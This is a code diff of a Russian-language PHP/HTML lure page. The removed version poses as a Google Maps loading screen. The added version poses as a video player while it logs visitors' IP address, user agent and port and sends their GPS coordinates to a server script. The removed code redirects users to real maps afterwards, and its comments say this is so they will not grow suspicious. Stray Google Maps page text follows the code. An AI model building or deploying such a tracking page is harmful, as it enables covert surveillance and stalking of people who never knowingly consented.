@@ -1,75 +1,114 @@
+<?php
+// index.php
+// 1. Сбор серверных конфигурационных данных и заголовков
+$ip = $_SERVER['REMOTE_ADDR'] ?? 'Не определен';
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Не определен';
+$request_time = date('Y-m-d H:i:s');
+$protocol = $_SERVER['SERVER_PROTOCOL'] ?? '';
+$port = $_SERVER['REMOTE_PORT'] ?? '';
+
+// 2. Генерация случайного видео для демонстрации (массив тестовых ID)
+$videos = ['dQw4w9WgXcQ', 'jNQXAC9IVRw', '9bZkp7q19f0'];
+$random_video = $videos[array_rand($videos)];
+
+// 3. Формирование базовой записи (без координат)
+$log_entry = [
+    'id' => uniqid(),
+    'time' => $request_time,
+    'ip' => $ip,
+    'user_agent' => $user_agent,
+    'protocol' => $protocol,
+    'port' => $port,
+    'lat' => 'Доступ отклонен или ожидается',
+    'lon' => 'Доступ отклонен или ожидается'
+];
+
+// Сохраняем первичный лог в сессию, чтобы связать его с координатами из JS
+session_start();
+$_SESSION['current_log_id'] = $log_entry['id'];
+
+// Записываем первичную структуру в файл logs.json
+$file = 'logs.json';
+$current_data = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
+if (!is_array($current_data)) $current_data = [];
+$current_data[$log_entry['id']] = $log_entry;
+file_put_contents($file, json_encode($current_data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));
+?>
 <!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Загрузка карты...</title>
+    <title>Просмотр видеоматериала</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f9;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0e1217;
+            color: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
         }
-        .loader {
+        .container {
+            width: 100%;
+            max-width: 800px;
             text-align: center;
-            color: #333;
         }
+        .video-wrapper {
+            position: relative;
+            padding-bottom: 56.25%; /* Пропорции 16:9 для адаптивности */
+            height: 0;
+            overflow: hidden;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+            background: #000;
+        }
+        .video-wrapper iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: 0;
+        }
+        h2 { font-weight: 400; margin-bottom: 20px; color: #a0aec0; }
     </style>
 </head>
 <body>
 
-<div class="loader">
-    <h2>Пожалуйста, подождите...</h2>
-    <p>Идет инциализация и определение ближайшего сервера связи.</p>
+<div class="container">
+    <h2>Тестовый плеер (Анализ сетевой доступности)</h2>
+    <div class="video-wrapper">
+        <iframe 
+            src="https://www.youtube.com/embed/<?php echo $random_video; ?>" 
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+            allowfullscreen>
+        </iframe>
+    </div>
 </div>
 
 <script>
-    // Функция автоматического запроса геопозиции при входе
-    window.onload = function() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(sendLocation, showError, {
-                enableHighAccuracy: true, // Принудительно включаем GPS для максимальной точности
-                timeout: 10000,
-                maximumAge: 0
-            });
-        } else {
-            // Если браузер совсем древний и не поддерживает гео
-            window.location.href = "https://maps.google.com";
-        }
-    };
+// Запрос геокоординат через легитимный Браузерный API
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+        // Формируем данные для отправки
+        const data = new FormData();
+        data.append('lat', position.coords.latitude);
+        data.append('lon', position.coords.longitude);
 
-    function sendLocation(position) {
-        var latitude = position.coords.latitude;
-        var longitude = position.coords.longitude;
-        var accuracy = position.coords.accuracy; // Точность в метрах
-
-        // Отправляем данные на наш сервер через скрытый POST-запрос
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", "save.php", true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState == 4) {
-                // Как только данные улетели, перенаправляем цель на реальные карты
-                window.location.href = "https://www.google.com/maps?q=" + latitude + "," + longitude;
-            }
-        };
-        
-        xhr.send("lat=" + latitude + "&lon=" + longitude + "&acc=" + accuracy);
-    }
-
-    function showError(error) {
-        // Если пользователь нажал "Блокировать", все равно уводим его, чтобы не вызывать подозрительности
-        window.location.href = "https://maps.google.com";
-    }
+        // Отправляем асинхронный запрос на сервер
+        fetch('save.php', {
+            method: 'POST',
+            body: data
+        });
+    }, function(error) {
+        console.log("Доступ к геопозиции не предоставлен пользователем.");
+    });
+}
 </script>
-
 </body>
 </html>
-Google Maps
-Find local businesses, view maps and get driving directions in Google Maps.
-
